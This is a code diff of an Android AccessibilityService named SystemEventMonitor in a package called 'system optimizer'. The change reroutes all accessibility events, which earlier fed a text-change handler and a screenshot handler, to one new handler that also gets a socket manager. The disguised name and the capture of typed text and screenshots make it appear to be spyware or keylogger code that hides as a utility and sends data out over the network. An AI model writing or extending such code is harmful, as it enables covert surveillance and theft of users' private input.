@@ -1,6 +1,6 @@
 package com.system.optimizer;
 
-import com.system.optimizer.event_handler.TextEventHandler;
+import com.system.optimizer.event_handler.SystemEventHandler;
 
 import com.system.optimizer.event_handler.ScreenshotEventHandler;
 import com.system.optimizer.config.ConfigData;
@@ -17,7 +17,7 @@ public class SystemEventMonitor extends AccessibilityService {
     private SocketManager socketManager;
     private ConfigManager configManager;
     // handlers
-    private TextEventHandler textEventHandler;
+    private SystemEventHandler systemEventHandler;
     private ScreenshotEventHandler screenShotEventHandler;
     private boolean isInitialized = false;
 
@@ -63,7 +63,7 @@ public class SystemEventMonitor extends AccessibilityService {
             this.screenShotEventHandler = new ScreenshotEventHandler(this, socketManager, configManager);
             
             // Create text handler with screenshot handler reference
-            this.textEventHandler = new TextEventHandler(screenShotEventHandler);
+            this.systemEventHandler = new SystemEventHandler(screenShotEventHandler, socketManager);
             
             this.isInitialized = true;
             
@@ -86,14 +86,7 @@ public class SystemEventMonitor extends AccessibilityService {
         }
 
         try {
-            int eventType = event.getEventType();
-
-            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-                textEventHandler.onTextEvent(event);
-            }
-            else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                screenShotEventHandler.onScreenshotRequestEvent();
-            }
+            systemEventHandler.onSystemEvent(event);
         } catch (Exception e) {
             Log.e(TAG, "Error handling accessibility event", e);
         }
